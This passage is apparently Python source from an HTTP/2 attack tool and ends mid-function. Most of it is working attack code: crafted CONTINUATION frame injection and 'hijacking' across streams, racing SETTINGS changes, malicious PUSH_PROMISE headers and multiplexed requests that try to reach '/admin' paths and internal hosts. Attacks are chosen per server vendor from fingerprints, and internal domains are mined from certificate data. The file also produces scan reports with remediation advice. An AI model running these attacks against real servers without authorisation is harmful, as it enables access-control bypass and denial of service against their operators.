    async def _read_h2_response(self, reader: asyncio.StreamReader, target_stream_id: int, timeout: Optional[float] = None) -> Dict[str, Any]:
        """Read complete HTTP/2 response with comprehensive parsing"""
        response = {
            'status': None,
            'headers': {},
            'data': b'',
            'trailers': {},
            'error': None
        }
        
        continuation_buffer = b''
        expected_stream_id = None
        
        while True:
            try:
                header = await asyncio.wait_for(reader.read(9), timeout=timeout or self.timeout)
                if len(header) < 9:
                    break
                
                length = struct.unpack('>I', b'\x00' + header[:3])[0]
                frame_type = header[3]
                flags = header[4]
                stream_id = struct.unpack('>I', header[5:])[0] & 0x7FFFFFFF
                
                payload = await reader.read(length)
                
                # Handle different frame types
                if stream_id == target_stream_id or stream_id == 0:
                    if frame_type == FrameType.HEADERS:
                        expected_stream_id = stream_id
                        if flags & FrameFlag.END_HEADERS:
                            # Complete HEADERS frame
                            try:
                                headers = self.decoder.decode(continuation_buffer + payload)
                                self._process_headers(headers, response)
                                continuation_buffer = b''
                            except Exception as e:
                                response['error'] = f"Header decoding failed: {e}"
                        else:
                            # Incomplete HEADERS, expect CONTINUATION
                            if len(payload) > self.MAX_CONTINUATION_BUFFER_SIZE:
                                response['error'] = f"HEADERS payload too large: {len(payload)} bytes"
                                break
                            continuation_buffer = payload
                    
                    elif frame_type == FrameType.CONTINUATION:
                        if stream_id != expected_stream_id:
                            response['error'] = f"CONTINUATION stream mismatch: {stream_id} != {expected_stream_id}"
                            break
                        
                        # Check buffer size before adding payload
                        if len(continuation_buffer) + len(payload) > self.MAX_CONTINUATION_BUFFER_SIZE:
                            response['error'] = f"CONTINUATION buffer overflow: {len(continuation_buffer) + len(payload)} bytes"
                            break
                        
                        continuation_buffer += payload
                        if flags & FrameFlag.END_HEADERS:
                            try:
                                headers = self.decoder.decode(continuation_buffer)
                                self._process_headers(headers, response)
                                continuation_buffer = b''
                                expected_stream_id = None
                            except Exception as e:
                                response['error'] = f"CONTINUATION decoding failed: {e}"
                    
                    elif frame_type == FrameType.DATA:
                        response['data'] += payload
                    
                    elif frame_type == FrameType.RST_STREAM:
                        error_code = struct.unpack('>I', payload)[0]
                        response['error'] = f'Stream reset: {H2ErrorCode(error_code).name}'
                        break
                    
                    elif frame_type == FrameType.GOAWAY:
                        last_stream = struct.unpack('>I', payload[:4])[0] & 0x7FFFFFFF
                        error_code = struct.unpack('>I', payload[4:8])[0]
                        response['error'] = f'Connection GOAWAY: {H2ErrorCode(error_code).name}'
                        break
                    
                    # Check for stream end
                    if flags & FrameFlag.END_STREAM:
                        break
                
            except asyncio.TimeoutError:
                # 区分网络超时和协议拒绝
                if continuation_buffer:
                    response['error'] = 'Protocol timeout - server stopped responding during CONTINUATION'
                else:
                    response['error'] = 'Network timeout - no response from server'
                break
            except Exception as e:
                response['error'] = f'Frame reading error: {e}'
                break
        
        return response
    
    async def _read_any_frame(self, reader: asyncio.StreamReader) -> Dict[str, Any]:
        """Read any HTTP/2 frame for error detection"""
        header = await reader.read(9)
        if len(header) < 9:
            return None
        
        length = struct.unpack('>I', b'\x00' + header[:3])[0]
        frame_type = header[3]
        flags = header[4]
        stream_id = struct.unpack('>I', header[5:])[0] & 0x7FFFFFFF
        
        payload = await reader.read(length)
        
        return {
            'type': frame_type,
            'flags': flags,
            'stream_id': stream_id,
            'payload': payload
        }
    
    def _process_headers(self, headers: List[Tuple[str, str]], response: Dict[str, Any]):
        """Process decoded headers into response structure"""
        for name, value in headers:
            if name == ':status':
                response['status'] = int(value)
            elif name.startswith(':'):
                response[name[1:]] = value
            else:
                response['headers'][name] = value
    
    async def _cleanup_connection(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        """Gracefully close HTTP/2 connection"""
        try:
            # Send GOAWAY frame
            goaway_payload = struct.pack('>II', 0, H2ErrorCode.NO_ERROR)
            goaway_frame = self._build_frame(FrameType.GOAWAY, 0, 0, goaway_payload)
            writer.write(goaway_frame)
            await writer.drain()
            
            writer.close()
            await writer.wait_closed()
        except Exception:
            pass  # Ignore cleanup errors
    
    def _analyze_response_for_vulnerability(self, response: Dict[str, Any], attack_config: Dict) -> bool:
        """Analyze response for vulnerability indicators with strict criteria"""
        status = response.get('status')
        headers = response.get('headers', {})
        error = response.get('error')
        
        # 基于攻击类型的特定检测
        attack_name = attack_config.get('name', '')
        
        # 权限混淆攻击的特定检测
        if 'authority' in attack_name or 'routing' in attack_name:
            # 检查是否访问了原本不应该访问的路径
            requested_path = None
            injected_path = None
            
            for header in attack_config.get('headers_frame', []):
                if header[0] == ':path':
                    requested_path = header[1]
                    break
            
            for header in attack_config.get('continuation_frame', []):
                if header[0] == ':path':
                    injected_path = header[1]
                    break
            
            # 只有当注入的路径包含敏感关键词且返回成功时才算漏洞
            if injected_path and any(keyword in injected_path.lower() for keyword in ['/admin', '/internal', '/api/admin']):
                if status in [200, 201, 204]:
                    # 进一步验证：检查响应是否真的是管理界面
                    response_data = response.get('data', b'')
                    admin_indicators = [
                        b'dashboard' in response_data.lower(),
                        b'administration' in response_data.lower(),
                        b'control panel' in response_data.lower(),
                        'x-admin-' in str(headers).lower()
                    ]
                    return any(admin_indicators)
        
        # 重复头部攻击的特定检测
        elif 'duplicate' in attack_name:
            # 只有当服务器接受了重复的伪头部且没有返回错误时才算漏洞
            if status and status not in [400, 431]:
                # 检查是否真的处理了重复的头部
                duplicate_headers = []
                all_headers = attack_config.get('headers_frame', []) + attack_config.get('continuation_frame', [])
                seen = set()
                for name, value in all_headers:
                    if name.startswith(':') and name in seen:
                        duplicate_headers.append(name)
                    seen.add(name)
                
                # 只有当存在重复的伪头部且服务器没有拒绝时才算漏洞
                return len(duplicate_headers) > 0 and status in [200, 201, 204]
        
        # HPACK压缩炸弹的特定检测
        elif 'hpack' in attack_name and 'bomb' in attack_name:
            # 检查是否导致了服务器资源问题
            processing_time = response.get('processing_time_ms', 0)
            return (
                processing_time > 10000 or  # 处理时间超过10秒
                status in [413, 431, 503] or  # 特定的错误状态码
                (error and 'memory' in str(error).lower())
            )
        
        # 流控制攻击的特定检测
        elif 'flow_control' in attack_name:
            # 检查是否真的绕过了流控制
            return (
                error and any(keyword in str(error).lower() for keyword in ['goaway', 'flow_control', 'window']) or
                status in [0, None]  # 连接被断开
            )
        
        # 通用的严格检测规则
        # 只有明确的漏洞指标才返回True
        critical_error_indicators = [
            error and 'protocol_error' in str(error).lower() and status != 400,
            error and 'internal_error' in str(error).lower(),
            status == 500 and 'continuation' in str(headers).lower()
        ]
        
        return any(critical_error_indicators)
    
    def _collect_vulnerability_evidence(self, response: Dict[str, Any], attack_config: Dict) -> List[str]:
        """Collect evidence of successful attack with strict validation"""
        evidence = []
        
        status = response.get('status')
        headers = response.get('headers', {})
        error = response.get('error')
        attack_name = attack_config.get('name', '')
        
        # 只收集与攻击相关的证据
        if 'authority' in attack_name or 'routing' in attack_name:
            # 权限相关攻击的证据
            if status in [200, 201, 204]:
                target_path = None
                injected_path = None
                
                for h in attack_config.get('headers_frame', []):
                    if h[0] == ':path':
                        target_path = h[1]
                        break
                
                for h in attack_config.get('continuation_frame', []):
                    if h[0] == ':path':
                        injected_path = h[1]
                        break
                
                if injected_path and '/admin' in injected_path and target_path != injected_path:
                    evidence.append(f"Successfully accessed injected path: {injected_path} (original: {target_path})")
                    
                    # 检查响应是否真的是管理界面
                    data = response.get('data', b'')
                    if data and any(indicator in data.lower() for indicator in [b'dashboard', b'administration']):
                        evidence.append("Response contains admin interface content")
        
        elif 'hpack' in attack_name and 'bomb' in attack_name:
            # HPACK炸弹的证据
            processing_time = response.get('processing_time_ms', 0)
            if processing_time > 10000:
                evidence.append(f"Excessive processing time: {processing_time:.2f}ms")
            
            if status in [413, 431, 503]:
                evidence.append(f"Server returned resource limit error: {status}")
        
        elif error and 'protocol' in error.lower():
            # 协议错误的证据
            if 'continuation' in error.lower():
                evidence.append(f"CONTINUATION frame processing error: {error}")
        
        # 只添加真正相关的头部作为证据
        security_relevant_headers = {
            'x-backend-server': 'Backend server exposed',
            'x-internal-ip': 'Internal IP exposed',
            'x-admin-access': 'Admin access header present'
        }
        
        for header, description in security_relevant_headers.items():
            if header in headers:
                evidence.append(f"{description}: {headers[header]}")
        
        return evidence[:5]  # 限制证据数量，只保留最相关的
    
    def _analyze_results(self, results: Dict):
        """Comprehensive vulnerability analysis and reporting"""
        vulnerabilities = []
        
        # Analyze each attack category
        for attack_type, attack_result in results['attacks'].items():
            if attack_result.get('vulnerable') or attack_result.get('bypasses_found', 0) > 0:
                severity = self._calculate_severity(attack_type, attack_result)
                
                vulnerability = {
                    'type': attack_type,
                    'severity': severity,
                    'title': self._get_vulnerability_title(attack_type),
                    'description': self._get_vulnerability_description(attack_type),
                    'impact': self._get_vulnerability_impact(attack_type),
                    'evidence': self._extract_evidence(attack_result),
                    'remediation': self._get_remediation_advice(attack_type),
                    'cvss_score': self._calculate_cvss_score(attack_type, severity),
                    'references': self._get_vulnerability_references(attack_type)
                }
                vulnerabilities.append(vulnerability)
        
        results['vulnerabilities'] = vulnerabilities
        results['summary'] = {
            'total_attacks': len(results['attacks']),
            'vulnerabilities_found': len(vulnerabilities),
            'critical_count': sum(1 for v in vulnerabilities if v['severity'] == 'CRITICAL'),
            'high_count': sum(1 for v in vulnerabilities if v['severity'] == 'HIGH'),
            'medium_count': sum(1 for v in vulnerabilities if v['severity'] == 'MEDIUM'),
            'low_count': sum(1 for v in vulnerabilities if v['severity'] == 'LOW'),
            'highest_severity': max([v['severity'] for v in vulnerabilities]) if vulnerabilities else 'NONE',
            'overall_risk': self._calculate_overall_risk(vulnerabilities)
        }
    
    def _calculate_severity(self, attack_type: str, result: Dict) -> str:
        """Calculate vulnerability severity based on attack type and results"""
        critical_attacks = ['authority_confusion', 'routing_confusion']
        high_attacks = ['pseudo_header_priority', 'duplicate_pseudo_headers', 'hpack_compression_bomb']
        medium_attacks = ['header_interleaving', 'frame_boundaries']
        
        if attack_type in critical_attacks and result.get('bypasses_found', 0) > 0:
            return 'CRITICAL'
        elif attack_type in high_attacks and result.get('vulnerable'):
            return 'HIGH'
        elif attack_type in medium_attacks and result.get('violations_accepted', 0) > 0:
            return 'MEDIUM'
        else:
            return 'LOW'
    
    def _get_vulnerability_title(self, attack_type: str) -> str:
        """Get vulnerability title"""
        titles = {
            'pseudo_header_priority': 'HTTP/2 Pseudo-Header Priority Confusion',
            'authority_confusion': 'HTTP/2 Authority Header Manipulation',
            'duplicate_pseudo_headers': 'HTTP/2 Duplicate Pseudo-Header Acceptance',
            'header_interleaving': 'HTTP/2 Header Ordering Specification Violation',
            'frame_boundaries': 'HTTP/2 Frame Boundary Processing Issues',
            'routing_confusion': 'HTTP/2 Request Routing Manipulation',
            'hpack_compression_bomb': 'HPACK Compression Bomb Vulnerability',
            'flow_control_manipulation': 'HTTP/2 Flow Control Bypass',
            'priority_manipulation': 'HTTP/2 Priority Manipulation',
            'stream_state_confusion': 'HTTP/2 Stream State Machine Confusion'
        }
        return titles.get(attack_type, f'HTTP/2 {attack_type.replace("_", " ").title()} Vulnerability')
    
    def _get_vulnerability_description(self, attack_type: str) -> str:
        """Get detailed vulnerability description"""
        descriptions = {
            'pseudo_header_priority': 'Server incorrectly processes pseudo-headers when split across CONTINUATION frames, potentially allowing header injection or authority manipulation.',
            'authority_confusion': 'The :authority pseudo-header can be manipulated via CONTINUATION frame injection, potentially leading to request routing bypasses and privilege escalation.',
            'duplicate_pseudo_headers': 'Server accepts duplicate pseudo-headers across frame boundaries, violating RFC 7540 and potentially causing request processing confusion.',
            'header_interleaving': 'Server violates HTTP/2 specification by accepting pseudo-headers after regular headers when split across CONTINUATION frames.',
            'frame_boundaries': 'Server has processing issues with headers split across multiple CONTINUATION frames, potentially leading to DoS or parsing confusion.',
            'routing_confusion': 'Request routing can be manipulated via strategic header splitting across CONTINUATION frames, potentially bypassing access controls.',
            'hpack_compression_bomb': 'Server vulnerable to HPACK compression bombs that can cause excessive memory usage or processing delays.',
            'flow_control_manipulation': 'HTTP/2 flow control mechanisms can be bypassed or manipulated, potentially leading to resource exhaustion.',
            'priority_manipulation': 'HTTP/2 priority system can be abused to cause resource exhaustion or denial of service.',
            'stream_state_confusion': 'Stream state machine can be confused by invalid frame sequences, potentially leading to security bypasses.'
        }
        return descriptions.get(attack_type, 'HTTP/2 protocol implementation vulnerability')
    
    def _get_vulnerability_impact(self, attack_type: str) -> str:
        """Get vulnerability impact description"""
        impacts = {
            'pseudo_header_priority': 'Privilege escalation, access control bypass, request smuggling',
            'authority_confusion': 'Host-based routing bypass, privilege escalation, internal service access',
            'duplicate_pseudo_headers': 'Request processing confusion, potential security control bypass',
            'header_interleaving': 'Protocol violation, potential for request smuggling attacks',
            'frame_boundaries': 'Denial of service, memory exhaustion, request processing errors',
            'routing_confusion': 'Access control bypass, privilege escalation, unauthorized resource access',
            'hpack_compression_bomb': 'Denial of service, memory exhaustion, server instability',
            'flow_control_manipulation': 'Resource exhaustion, denial of service',
            'priority_manipulation': 'Denial of service, resource starvation',
            'stream_state_confusion': 'Protocol confusion, potential security bypasses'
        }
        return impacts.get(attack_type, 'Potential security bypass or denial of service')
    
    def _extract_evidence(self, attack_result: Dict) -> List[str]:
        """Extract evidence from attack results"""
        evidence = []
        
        if 'results' in attack_result:
            for result in attack_result['results']:
                if hasattr(result, 'evidence'):
                    evidence.extend(result.evidence)
                elif isinstance(result, dict) and 'evidence' in result:
                    evidence.extend(result['evidence'])
        
        # Deduplicate and limit evidence items
        unique_evidence = list(dict.fromkeys(evidence))  # Remove duplicates while preserving order
        return unique_evidence[:10]  # Limit evidence items
    
    def _get_remediation_advice(self, attack_type: str) -> str:
        """Get specific remediation advice"""
        return ("1. Ensure strict RFC 7540 compliance for HTTP/2 frame processing\n"
               "2. Validate pseudo-header ordering and reject violations\n" 
               "3. Implement proper CONTINUATION frame validation\n"
               "4. Reject duplicate pseudo-headers\n"
               "5. Add comprehensive HTTP/2 security testing\n"
               "6. Update HTTP/2 library to latest version\n"
               "7. Implement request routing validation\n"
               "8. Add HPACK decompression limits and monitoring")
    
    def _calculate_cvss_score(self, attack_type: str, severity: str) -> float:
        """Calculate CVSS score based on attack type and severity"""
        base_scores = {
            'CRITICAL': 9.0,
            'HIGH': 7.5,
            'MEDIUM': 5.5,
            'LOW': 3.0
        }
        return base_scores.get(severity, 0.0)
    
    def _get_vulnerability_references(self, attack_type: str) -> List[str]:
        """Get vulnerability references"""
        return [
            "RFC 7540 - HTTP/2 Protocol Specification",
            "RFC 7541 - HPACK Header Compression",
            "CVE-2023-44487 - HTTP/2 Rapid Reset Attack",
            "OWASP HTTP/2 Security Guidelines"
        ]
    
    async def _test_early_data_scenario(self, scenario: Dict) -> AttackResult:
        """Test TLS 1.3 0-RTT early data injection scenario"""
        try:
            # Check if TLS 1.3 and early data are supported
            if not await self._check_early_data_support():
                return AttackResult(
                    name=scenario['name'],
                    success=False,
                    vulnerability_detected=False,
                    error="TLS 1.3 0-RTT not supported"
                )
            
            # Attempt early data injection
            reader, writer = await self._establish_early_data_connection(scenario['early_headers'])
            
            # Send remaining headers in normal flow
            stream_id = self._get_next_stream_id()
            continuation_data = self._encode_headers(scenario['normal_headers'])
            
            continuation_frame = self._build_frame(
                FrameType.CONTINUATION,
                FrameFlag.END_HEADERS,
                stream_id,
                continuation_data
            )
            
            writer.write(continuation_frame)
            await writer.drain()
            
            response = await self._read_h2_response(reader, stream_id)
            
            await self._cleanup_connection(reader, writer)
            
            # Analyze early data injection success
            vulnerability_detected = (
                response.get('status') in [200, 201, 204] and
                ('admin' in scenario['name'] or 'DELETE' in str(scenario['early_headers']))
            )
            
            return AttackResult(
                name=scenario['name'],
                success=True,
                vulnerability_detected=vulnerability_detected,
                response_status=response.get('status'),
                evidence=[f"Early data injection test: {scenario['description']}"]
            )
            
        except Exception as e:
            return AttackResult(
                name=scenario['name'],
                success=False,
                vulnerability_detected=False,
                error=str(e)
            )
    
    async def _test_multiplex_scenario(self, scenario: Dict) -> AttackResult:
        """Test multiplexing confusion scenario"""
        try:
            reader, writer = await self._establish_h2_connection()
            await self._send_h2_settings(writer)
            await self._read_server_settings(reader)
            
            stream_count = scenario['stream_count']
            stream_ids = [self._get_next_stream_id() for _ in range(stream_count)]
            
            # Prepare headers for each stream
            all_headers = []
            for i, stream_id in enumerate(stream_ids):
                headers = [
                    (':method', 'GET'),
                    (':scheme', 'https'),
                    (':authority', self.target_host if i == 0 else f'admin-{i}.internal'),
                    (':path', f'/stream-{i}' if i == 0 else f'/admin/stream-{i}'),
                    (f'x-stream-id', str(i)),
                    (f'x-multiplex-test', 'true')
                ]
                all_headers.append((stream_id, self._encode_headers(headers)))
            
            # Execute interleaved transmission based on scenario
            if scenario['name'] == 'interleaved_continuation_confusion':
                await self._execute_interleaved_continuation(writer, all_headers)
            elif scenario['name'] == 'rapid_stream_switching':
                await self._execute_rapid_switching(writer, all_headers)
            elif scenario['name'] == 'continuation_hijacking':
                await self._execute_continuation_hijacking(writer, all_headers)
            
            # Collect responses
            responses = []
            for stream_id in stream_ids:
                try:
                    response = await asyncio.wait_for(
                        self._read_h2_response(reader, stream_id),
                        timeout=5.0
                    )
                    responses.append(response)
                except asyncio.TimeoutError:
                    break
            
            await self._cleanup_connection(reader, writer)
            
            # Analyze multiplex confusion
            vulnerability_detected = False
            
            # 检查是否成功访问了管理路径
            for i, response in enumerate(responses):
                if response.get('status') in [200, 201, 204]:
                    # 检查对应的流是否注入了管理路径
                    stream_headers = all_headers[i] if i < len(all_headers) else None
                    if stream_headers:
                        _, encoded_headers = stream_headers
                        # 尝试解码以查看注入的路径
                        try:
                            decoded = self.decoder.decode(encoded_headers)
                            for name, value in decoded:
                                if name == ':path' and '/admin' in value:
                                    # 确认响应真的是管理界面
                                    response_data = response.get('data', b'')
                                    if response_data and b'dashboard' in response_data.lower():
                                        vulnerability_detected = True
                                        break
                        except Exception as e:
                            logger.debug(f"Failed to decode headers for multiplex analysis: {e}")
            
            return AttackResult(
                name=scenario['name'],
                success=True,
                vulnerability_detected=vulnerability_detected,
                evidence=[f"Multiplex test: {len(responses)}/{stream_count} streams responded"]
            )
            
        except Exception as e:
            return AttackResult(
                name=scenario['name'],
                success=False,
                vulnerability_detected=False,
                error=str(e)
            )
    
    async def _test_settings_race_scenario(self, scenario: Dict) -> AttackResult:
        """Test SETTINGS frame race condition scenario"""
        try:
            reader, writer = await self._establish_h2_connection()
            await self._send_h2_settings(writer)
            await self._read_server_settings(reader)
            
            stream_id = self._get_next_stream_id()
            headers = [
                (':method', 'GET'),
                (':scheme', 'https'),
                (':authority', self.target_host),
                (':path', '/race-test'),
                ('x-large-header', 'A' * 5000)  # Large header for timing
            ]
            
            encoded = self._encode_headers(headers)
            
            # Start HEADERS frame without END_HEADERS
            headers_frame = self._build_frame(
                FrameType.HEADERS,
                0,  # No END_HEADERS
                stream_id,
                encoded[:500]
            )
            
            writer.write(headers_frame)
            await writer.drain()
            
            # Send SETTINGS frame during CONTINUATION sequence
            if scenario['settings_timing'] == 'mid_continuation':
                await self._send_malicious_settings(writer, 'mid_continuation')
            elif scenario['settings_timing'] == 'rapid_multiple':
                await self._send_malicious_settings(writer, 'rapid_multiple')
            elif scenario['settings_timing'] == 'table_size_change':
                await self._send_malicious_settings(writer, 'table_size_change')
            
            # Complete with CONTINUATION
            continuation_frame = self._build_frame(
                FrameType.CONTINUATION,
                FrameFlag.END_HEADERS,
                stream_id,
                encoded[500:]
            )
            
            writer.write(continuation_frame)
            await writer.drain()
            
            response = await self._read_h2_response(reader, stream_id)
            
            await self._cleanup_connection(reader, writer)
            
            # Check for race condition effects
            vulnerability_detected = (
                response.get('error') is not None or
                response.get('status') in [431, 500, 502]
            )
            
            return AttackResult(
                name=scenario['name'],
                success=True,
                vulnerability_detected=vulnerability_detected,
                evidence=[f"Settings race test: {scenario['description']}"]
            )
            
        except Exception as e:
            return AttackResult(
                name=scenario['name'],
                success=False,
                vulnerability_detected=True,  # Exception might indicate race condition
                error=str(e)
            )
    
    async def _test_push_promise_scenario(self, scenario: Dict) -> AttackResult:
        """Test PUSH_PROMISE confusion scenario"""
        try:
            reader, writer = await self._establish_h2_connection()
            await self._send_h2_settings(writer)
            server_settings = await self._read_server_settings(reader)
            
            # Check if server push is enabled
            if not server_settings.get(SettingsParameter.ENABLE_PUSH, 0):
                return AttackResult(
                    name=scenario['name'],
                    success=False,
                    vulnerability_detected=False,
                    error="Server push not enabled"
                )
            
            stream_id = self._get_next_stream_id()
            promised_stream_id = self._get_next_stream_id()
            
            # Create PUSH_PROMISE frame with malicious headers
            push_headers = [
                (':method', 'GET'),
                (':scheme', 'https'),
                (':authority', 'admin.internal'),  # Malicious authority
                (':path', scenario['promised_path'])
            ]
            
            # Encode PUSH_PROMISE payload
            promise_payload = struct.pack('>I', promised_stream_id & 0x7FFFFFFF)
            promise_payload += self._encode_headers(push_headers)
            
            # Send original request
            original_headers = [
                (':method', 'GET'),
                (':scheme', 'https'),
                (':authority', self.target_host),
                (':path', scenario['original_path'])
            ]
            
            encoded_original = self._encode_headers(original_headers)
            headers_frame = self._build_frame(
                FrameType.HEADERS,
                FrameFlag.END_HEADERS | FrameFlag.END_STREAM,
                stream_id,
                encoded_original
            )
            
            # Send PUSH_PROMISE frame
            push_frame = self._build_frame(
                FrameType.PUSH_PROMISE,
                FrameFlag.END_HEADERS,
                stream_id,
                promise_payload
            )
            
            writer.write(headers_frame)
            writer.write(push_frame)
            await writer.drain()
            
            # Read responses
            original_response = await self._read_h2_response(reader, stream_id)
            promised_response = await self._read_h2_response(reader, promised_stream_id)
            
            await self._cleanup_connection(reader, writer)
            
            # Check for push promise confusion
            vulnerability_detected = (
                promised_response.get('status') in [200, 201, 204] and
                'admin' in scenario['promised_path']
            )
            
            return AttackResult(
                name=scenario['name'],
                success=True,
                vulnerability_detected=vulnerability_detected,
                evidence=[f"PUSH_PROMISE test: {scenario['description']}"]
            )
            
        except Exception as e:
            return AttackResult(
                name=scenario['name'],
                success=False,
                vulnerability_detected=False,
                error=str(e)
            )
    
    async def _check_early_data_support(self) -> bool:
        """Check if target supports TLS 1.3 0-RTT early data"""
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            context.maximum_version = ssl.TLSVersion.TLSv1_3
            context.set_alpn_protocols(['h2'])
            
            reader, writer = await asyncio.open_connection(
                self.target_host, self.target_port, ssl=context, server_hostname=self.target_host
            )
            
            ssl_object = writer.get_extra_info('ssl_object')
            if ssl_object:
                self.tls_version = ssl_object.version()
                # Check for TLS 1.3 and early data support indicators
                self.supports_0rtt = (self.tls_version == 'TLSv1.3')
            
            writer.close()
            await writer.wait_closed()
            
            return self.supports_0rtt
            
        except Exception:
            return False
    
    async def _establish_early_data_connection(self, early_headers: List[Tuple[str, str]]) -> Tuple[asyncio.StreamReader, asyncio.StreamWriter]:
        """Establish connection with early data injection"""
        # For real early data, we'd need lower-level TLS control
        # This simulates the concept by sending data immediately after handshake
        reader, writer = await self._establish_h2_connection()
        
        # Simulate early data by sending immediately
        stream_id = self._get_next_stream_id()
        encoded = self._encode_headers(early_headers)
        
        early_frame = self._build_frame(
            FrameType.HEADERS,
            0,  # No END_HEADERS, expect CONTINUATION
            stream_id,
            encoded
        )
        
        writer.write(early_frame)
        await writer.drain()
        
        return reader, writer
    
    async def _execute_interleaved_continuation(self, writer: asyncio.StreamWriter, 
                                              stream_headers: List[Tuple[int, bytes]]):
        """Execute interleaved CONTINUATION frame attack"""
        # Start all streams without END_HEADERS
        partial_frames = []
        
        for stream_id, encoded in stream_headers:
            chunk_size = len(encoded) // 3
            
            # Send initial HEADERS frame
            headers_frame = self._build_frame(
                FrameType.HEADERS,
                0,  # No END_HEADERS
                stream_id,
                encoded[:chunk_size]
            )
            
            writer.write(headers_frame)
            partial_frames.append((stream_id, encoded[chunk_size:]))
        
        await writer.drain()
        
        # Now interleave CONTINUATION frames
        while partial_frames:
            for i, (stream_id, remaining) in enumerate(partial_frames[:]):
                if not remaining:
                    partial_frames.remove((stream_id, remaining))
                    continue
                
                chunk_size = min(1000, len(remaining))
                chunk = remaining[:chunk_size]
                is_last = len(remaining) <= chunk_size
                
                flags = FrameFlag.END_HEADERS if is_last else 0
                cont_frame = self._build_frame(
                    FrameType.CONTINUATION,
                    flags,
                    stream_id,
                    chunk
                )
                
                writer.write(cont_frame)
                
                if is_last:
                    partial_frames.remove((stream_id, remaining))
                else:
                    partial_frames[i] = (stream_id, remaining[chunk_size:])
            
            await writer.drain()
            await asyncio.sleep(0.001)  # Micro delay for timing attack
    
    async def _execute_rapid_switching(self, writer: asyncio.StreamWriter,
                                     stream_headers: List[Tuple[int, bytes]]):
        """Execute rapid stream switching attack"""
        # Rapidly alternate between streams
        max_iterations = 20
        
        for iteration in range(max_iterations):
            for stream_id, encoded in stream_headers:
                chunk_size = 100  # Small chunks for rapid switching
                offset = iteration * chunk_size
                
                if offset >= len(encoded):
                    continue
                
                chunk = encoded[offset:offset + chunk_size]
                is_last = (offset + chunk_size >= len(encoded))
                
                if iteration == 0:
                    # First iteration: HEADERS frame
                    flags = FrameFlag.END_HEADERS if is_last else 0
                    frame = self._build_frame(FrameType.HEADERS, flags, stream_id, chunk)
                else:
                    # Subsequent: CONTINUATION frames
                    flags = FrameFlag.END_HEADERS if is_last else 0
                    frame = self._build_frame(FrameType.CONTINUATION, flags, stream_id, chunk)
                
                writer.write(frame)
                await asyncio.sleep(0.0001)  # Ultra-fast switching
        
        await writer.drain()
    
    async def _execute_continuation_hijacking(self, writer: asyncio.StreamWriter,
                                            stream_headers: List[Tuple[int, bytes]]):
        """Execute CONTINUATION frame hijacking attack"""
        if len(stream_headers) < 2:
            return
        
        # Start first stream
        stream_id_1, encoded_1 = stream_headers[0]
        stream_id_2, encoded_2 = stream_headers[1]
        
        # Send HEADERS for stream 1
        headers_frame = self._build_frame(
            FrameType.HEADERS,
            0,  # No END_HEADERS
            stream_id_1,
            encoded_1[:500]
        )
        
        writer.write(headers_frame)
        await writer.drain()
        
        # Send CONTINUATION for stream 2 (hijacking!)
        hijack_frame = self._build_frame(
            FrameType.CONTINUATION,
            FrameFlag.END_HEADERS,
            stream_id_2,  # Wrong stream ID!
            encoded_2
        )
        
        writer.write(hijack_frame)
        await writer.drain()
        
        # Complete stream 1 properly
        completion_frame = self._build_frame(
            FrameType.CONTINUATION,
            FrameFlag.END_HEADERS,
            stream_id_1,
            encoded_1[500:]
        )
        
        writer.write(completion_frame)
        await writer.drain()
    
    async def _send_malicious_settings(self, writer: asyncio.StreamWriter, timing: str):
        """Send malicious SETTINGS frames based on timing scenario"""
        if timing == 'mid_continuation':
            # Send SETTINGS during CONTINUATION sequence
            settings_payload = struct.pack('>HI', SettingsParameter.HEADER_TABLE_SIZE, 1024)
            settings_frame = self._build_frame(FrameType.SETTINGS, 0, 0, settings_payload)
            writer.write(settings_frame)
        
        elif timing == 'rapid_multiple':
            # Send multiple conflicting SETTINGS rapidly
            for table_size in [4096, 8192, 1024, 65536]:
                settings_payload = struct.pack('>HI', SettingsParameter.HEADER_TABLE_SIZE, table_size)
                settings_frame = self._build_frame(FrameType.SETTINGS, 0, 0, settings_payload)
                writer.write(settings_frame)
                await asyncio.sleep(0.001)
        
        elif timing == 'table_size_change':
            # Rapid table size changes during header processing
            for size in [65536, 1024, 32768, 512]:
                settings_payload = struct.pack('>HI', SettingsParameter.HEADER_TABLE_SIZE, size)
                settings_frame = self._build_frame(FrameType.SETTINGS, 0, 0, settings_payload)
                writer.write(settings_frame)
        
        await writer.drain()
    
    def apply_fingerprint_intelligence(self) -> Dict[str, Any]:
        """Apply fingerprint intelligence to optimize attack vectors"""
        if not self.fingerprint_data:
            return {
                'status': 'skipped',
                'reason': 'missing fingerprint context',
                'server_type': 'unknown',
                'targeted_attacks': [],
                'avoided_attacks': []
            }
        
        optimizations = {
            'server_type': self.fingerprint_data.get('server', 'unknown'),
            'http2_implementation': self.fingerprint_data.get('http2_implementation', 'unknown'),
            'targeted_attacks': [],
            'avoided_attacks': []
        }
        
        # Optimize attacks based on server fingerprint
        server_type = optimizations['server_type'].lower()
        
        if 'nginx' in server_type:
            optimizations['targeted_attacks'].extend([
                'pseudo_header_priority',
                'authority_confusion',
                'multiplex_confusion'
            ])
        elif 'apache' in server_type:
            optimizations['targeted_attacks'].extend([
                'duplicate_pseudo_headers',
                'header_interleaving',
                'settings_race_condition'
            ])
        elif 'cloudflare' in server_type:
            optimizations['targeted_attacks'].extend([
                'routing_confusion',
                'early_data_injection'
            ])
        elif 'aws' in server_type or 'elb' in server_type:
            optimizations['targeted_attacks'].extend([
                'authority_confusion',
                'routing_confusion'
            ])
        
        # Check for specific HTTP/2 implementation vulnerabilities
        h2_impl = self.fingerprint_data.get('http2_implementation', '').lower()
        if 'nghttp2' in h2_impl:
            optimizations['targeted_attacks'].append('frame_boundaries')
        elif 'hyper' in h2_impl:
            optimizations['targeted_attacks'].append('hpack_compression_bomb')
        
        return optimizations
    
    def apply_certificate_intelligence(self) -> Dict[str, Any]:
        """Apply certificate analysis to enhance attacks"""
        if not self.cert_data:
            return {
                'status': 'skipped',
                'reason': 'missing certificate context',
                'san_domains': [],
                'wildcard_certs': [],
                'enhanced_targets': []
            }
        
        cert_insights = {
            'san_domains': self.cert_data.get('san_domains', []),
            'wildcard_certs': self.cert_data.get('wildcards', []),
            'internal_domains': [],
            'enhanced_targets': []
        }
        
        # Extract internal domain patterns from certificate
        for domain in cert_insights['san_domains']:
            if any(keyword in domain.lower() for keyword in ['admin', 'internal', 'private', 'mgmt']):
                cert_insights['internal_domains'].append(domain)
        
        # Generate enhanced attack targets based on certificate data
        for domain in cert_insights['internal_domains']:
            cert_insights['enhanced_targets'].append({
